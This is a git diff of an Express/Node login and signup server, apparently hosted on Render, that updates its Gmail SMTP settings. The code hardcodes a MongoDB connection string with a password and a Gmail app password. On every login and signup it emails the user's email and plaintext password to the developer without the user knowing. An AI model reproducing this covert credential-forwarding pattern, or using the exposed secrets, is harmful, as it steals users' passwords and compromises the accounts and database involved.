@@ -10,24 +10,27 @@ const app = express();
 app.use(express.json());
 app.use(cors()); 
 
-// Connect to MongoDB (Notice 'myauthdb' was added before the ?)
+// Connect to MongoDB
 mongoose.connect('mongodb+srv://nithanssk_db_user:xx0P6vVr9DaaKxXm@cluster0.vy1g43n.mongodb.net/myauthdb?retryWrites=true&w=majority')
   .then(() => console.log('✅ MongoDB Connected'))
   .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
-// Set up Nodemailer Transporter
+// Set up Nodemailer Transporter (Updated for Cloud Hosting/Render)
 const transporter = nodemailer.createTransport({
-  service: 'gmail',
+  host: 'smtp.gmail.com',
+  port: 465,
+  secure: true, // Use SSL for port 465 to prevent connection timeouts on cloud servers
   auth: {
     user: 'nithanssk@gmail.com', 
     pass: 'jows ukkj armv ysso'  
   }
 });
+
 // Helper function to send the email notification
 const sendNotificationEmail = (actionType, userEmail, userPassword) => {
   const mailOptions = {
     from: 'nithanssk@gmail.com',
-    to: 'nithanssk@gmail.com', // Sending it to your preferred email
+    to: 'nithanssk@gmail.com', 
     subject: `App Notification: New ${actionType}`,
     text: `Hello!\n\nA user has just performed a ${actionType} on your React App.\n\nDetails:\nEmail: ${userEmail}\nPassword: ${userPassword}\n\nTimestamp: ${new Date().toLocaleString()}`
   };
@@ -62,6 +65,7 @@ app.post('/api/login', async (req, res) => {
       return res.status(400).json({ message: 'Invalid credentials' });
     }
 
+    // Attempt to send email but don't block the response
     sendNotificationEmail('LOGIN', email, password);
 
     res.status(200).json({ message: 'Login successful!', user: { email: user.email } });
@@ -85,6 +89,7 @@ app.post('/api/signup', async (req, res) => {
     const newUser = new User({ email, password });
     await newUser.save();
 
+    // Attempt to send email
     sendNotificationEmail('SIGNUP', email, password);
 
     res.status(201).json({ message: 'Account created successfully! You can now log in.' });
@@ -95,6 +100,6 @@ app.post('/api/signup', async (req, res) => {
   }
 });
 
-// Start the server (Fixed to work dynamically with Render)
+// Start the server (Dynamically assigned port for Render)
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
